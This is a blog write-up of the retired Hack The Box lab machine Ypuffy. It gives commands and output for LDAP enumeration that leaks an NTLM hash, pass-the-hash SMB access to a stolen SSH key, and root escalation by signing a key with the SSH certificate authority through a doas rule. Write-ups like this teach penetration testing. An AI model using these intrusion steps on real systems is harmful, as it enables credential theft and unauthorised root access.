Hey there! I've just switched over my old blog website to this new one, so I hope that this will be a better setup and that I will update this one more often!

This first post is going to a write up on the newly retired machine Ypuffy from hackthebox.eu. This was a really interesting (albeit at times, frutrating) box with some unique vectors. From OpenLDAP to fumbling around with BSD. Let's jump into the writeup.



Nmap Output
-----------

```shell
root@kali:~/Documents/htb/boxes/Ypuffy# nmap -sV -sC -oA nmap/initial 10.10.10.107
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 20:05 EST
Nmap scan report for 10.10.10.107
Host is up (0.043s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY

Host script results:
|_clock-skew: mean: 1h44m52s, deviation: 2h53m12s, median: 4m51s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2019-02-09T20:10:50-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-02-09 20:10:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                              
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
```

As we can see, there are some ports that are good to start off with.

Immediately a few ports are enticing to investigate. First is port 80, which is advertising as `OpenBSD httpd` but nmap didn't run any default scripts against it, which is suspicious. Let's look into that first.


HTTP (OpenBSD httpd)
--------------------

I first start out with a classic `curl` command which returns the following:

```shell
root@kali:~/Documents/htb/boxes/Ypuffy# curl -v http://10.10.10.107
*   Trying 10.10.10.107...
* TCP_NODELAY set
* Connected to 10.10.10.107 (10.10.10.107) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.107
> User-Agent: curl/7.63.0
> Accept: */*
> 
* Empty reply from server
* Connection #0 to host 10.10.10.107 left intact
curl: (52) Empty reply from server
root@kali:~/Documents/htb/boxes/Ypuffy# 
```

This is getting a bit weird... Moving on to try and enumerate any directories, hoping maybe that something was just up with request I made, I fire off a gobuster scan which returns the following:

```shell
root@kali:~/Documents/htb/boxes/Ypuffy# gobuster -u http://10.10.10.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                        

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.107/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/02/10 13:45:41 Starting gobuster
=====================================================
2019/02/10 13:45:41 [!] unable to connect to http://10.10.10.107/: Get http://10.10.10.107/: EOF                                                               
=====================================================
2019/02/10 13:45:41 Finished
=====================================================
```

This is getting out of hand! This is becoming more and more of a dead end. Let's move onto port 389 being advertised as ldap.


LDAP (Port 389)
---------------

I searched around for different ways to enumerate LDAP on a BSD host, and I found a few nmap scripts that would be helpful. I started with the module `ldap-search` which enumerates ldap for different directories within it. My syntax for this was `nmap -p 389 --script ldap-search 10.10.10.107` which returned something interesting:

```shell
     userPassword: {BSDAUTH}alice1978                                                                                                                            
     homeDirectory: /home/alice1978                                                                                                                              
     loginShell: /bin/ksh                                                                                                                                        
     displayName: Alice                                                                                                                                          
     sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B    
```

This looks to be an NTLM hash for SMB (which we also saw open on this host!). This is great, I kept following this trail. I then moved over to `smbclient` to try and see if I could get anything from this hash. Running `smbclient -U alice1978 --pw-nt-hash -L 10.10.10.107` provided some useful information below:

```shell
    Sharename       Type      Comment                                                                                                                            
    ---------       ----      -------                                                                                                                            
    alice           Disk      Alice's Windows Directory                                                                                                          
    IPC$            IPC       IPC Service (Samba Server)
```

Looks like we have the default IPC$ directory along with a custom directory. The arguement `--pw-nt-hash` allows you to enter an NTLM hash when prompted for a password when accessing the smb service, nifty!

Let's enumerate this `alice` share a bit more!


```shell
root@kali:~/Documents/htb/boxes/Ypuffy# smbclient -U alice1978 --pw-nt-hash \\\\10.10.10.107\\alice                                                            
Enter WORKGROUP\alice1978's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 30 22:54:20 2018
  ..                                  D        0  Tue Jul 31 23:16:50 2018
  my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018

                433262 blocks of size 1024. 411540 blocks available
smb: \> 
```

Looks like we have a private key within this directory. I grabbed it using `get my_private_key.ppk` in the smbclient command line. Once this was on my local box, I then quickly did some research on how to extract information from .ppk files. These are generally used for PuTTy to establish SSH connections, but we're going to turn this into something we can use on the command line.

First, I installed puttygen by running `apt install putty-tools` on my Kali machine. Now with this tool we can run the following: `puttygen my_private_key.ppk -O private-openssh -o alice_key.key`. This will take the .ppk file we pulled, turn it into a private OpenSSH key and output it into a file that I named `alice_key.key`.

One this is complete, we can try and test it on the box!

```shell
root@kali:~/Documents/htb/boxes/Ypuffy# chmod 600 alice_key.key 
root@kali:~/Documents/htb/boxes/Ypuffy# ssh -i alice_key.key alice1978@10.10.10.107
The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.
ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.107' (ECDSA) to the list of known hosts.
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ id
uid=5000(alice1978) gid=5000(alice1978) groups=5000(alice1978)
ypuffy$ hostname
ypuffy.hackthebox.htb
ypuffy$
```

And we're in! At this point you can grab the user.txt file and own user! Let's move onto priv esc.


Privilege Escalation
--------------------


Since this is an OpenBSD host, many things will be different than on the Linux environments seen before on HackTheBox. The first thing that really tripped me up was the fact that `sudo` was not a thing on this host. Doing some research shows that OpenBSD has a similar tools called `doas`. Normally the first thing I will check when getting access to a machine is if the user I am has any sudo permissions. There doesn't seem to be a way to do this on OpenBSD machines using `doas`, but ther is a configuration file that we can look at that will tell us similar information.

```shell
ypuffy$ cat /etc/doas.conf                                                                                                                                     
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
ypuffy$ 
```

What this file is telling us is that our user (alice1978) can run the command `/usr/bin/ssh-keygen` as the user `userca` without supplying a password. So this must be our vector of getting root. Let's dig deeper!


Getting root with ssh-keygen
----------------------------

So since ssh seems to be our vector to obtain root, I first looked at the sshd config file. This contained a few interesting lines that aren't normal to see.

```shell
TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody
```

So it seems that the Trusted Certificate Authority keys are located in the `userca` home directory, and that you can obtain the list of Authorized Principals by issuing the `curl` command noted in the file.

Brief explanation of Certficate authentication with SSH
-------------------------------------------------------

Before getting into the privilege escalation any further, I felt the need to try and explain this a bit further the best I could. When an SSH server is configured to use Certificate Authorities, the system administrator, or whoever is in charge of maintaining access, utilizes the signing of SSH keys to make them trusted. When a trusted Certificate Authority signs a key for a user, that means that user can login in no matter where they are, as long as the user is trusted within the target destination. Using `ssh-keygen` as a Certificate Authority, you are signing a key to a user that the server will trust no matter where they log in from. So abusing this can be very dangerous. Let's see this in action.


Leveraging ssh-keygen to get root
---------------------------------

So we know the command we need to run in order to get the principals to create signed keys for any user using the `curl` command seen in the sshd configuration file. Running this against the user `root` reveals the principal as seen below:

```shell
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"
3m3rgencyB4ckd00r
ypuffy$
```

We see that the principal for the root user is `3m3rgencyB4ckd00r`. Now that we know the principal, we know where the CA key is (in the user `userca`'s home directory) we can know try and leverage this.

First I generated a pair of rsa keys on my Kali box with the command `ssh-keygen -t rsa` and saved them to my working directory. I then transfered the public key to the Ypuffy machine to get it certified!

After this I run the command that was seen in the doas configuration file: `doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I cert_anubis -n 3m3rgencyB4ckd00r id_rsa.pub`. Breaking that command down will see what is happening:

[+] `-u userca` - Running command as the userca user
[+] `-s /home/userca/ca` - Using the ca private key that is the configured key to sign other keys
[+] `-I cert_anubis` - This is the name of the certification which can be anything
[+] `-n 3m3rgencyB4ckd00r` - Principal found for the user root, who we would like to SSH in as
[+] `id_rsa.pub` - The public key that was generated on our Kali box that is getting certified


Now that we have these in place, all we need to do is copy over the new certification file (in this case it will be named "id_rsa-cert.pub") to where our private and public key pairs are hosted on our Kali box. Once this is done we can then SSH as root into Ypuffy as seen below:

```shell
root@kali:~/Documents/htb/boxes/Ypuffy# ssh -i id_rsa 10.10.10.107
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy# id                                                                                                                                              
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
ypuffy# 
```

And we are root! A super unique privilege escalation that required a lot of reading and research on my part. 

Hope you enjoyed this write up! I will probably alternate between recording retired machine's on my Youtube channel and putting them up on here. I might host some videos on this blog as well! Until next time!

-Anubis
